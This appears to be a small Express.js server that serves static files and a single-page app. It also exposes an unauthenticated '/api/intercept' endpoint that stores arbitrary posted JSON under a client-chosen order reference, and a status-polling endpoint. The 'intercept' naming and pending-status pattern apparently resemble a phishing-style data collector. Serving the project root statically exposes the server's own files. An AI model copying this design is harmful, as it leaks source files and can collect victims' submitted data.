const express = require('express');
const path = require('path');
const app = express();
const port = process.env.PORT || 8080;

app.use(express.json());

// Serve static files from 'assets'
app.use('/assets', express.static(path.join(__dirname, 'assets'), {
    setHeaders: (res, filePath) => {
        if (filePath.endsWith('.js')) {
            res.setHeader('Content-Type', 'application/javascript');
        }
    }
}));

// Serve other static files from root
app.use(express.static(path.join(__dirname)));

// API for sync (MaawenSync)
let orders = {};
app.post('/api/intercept', (req, res) => {
    const data = req.body;
    const orderRef = data.order_ref || `ORD-${Date.now()}`;
    orders[orderRef] = { ...orders[orderRef], ...data, status: 'pending' };
    res.json({ success: true, orderRef: orderRef });
});

app.get('/api/orders/:ref/status', (req, res) => {
    const order = orders[req.params.ref];
    res.json({ status: order ? order.status : 'pending' });
});

// SPA routing - ALWAYS return index.html for non-file requests
app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.listen(port, () => {
    console.log(`Server running on port ${port}`);
});
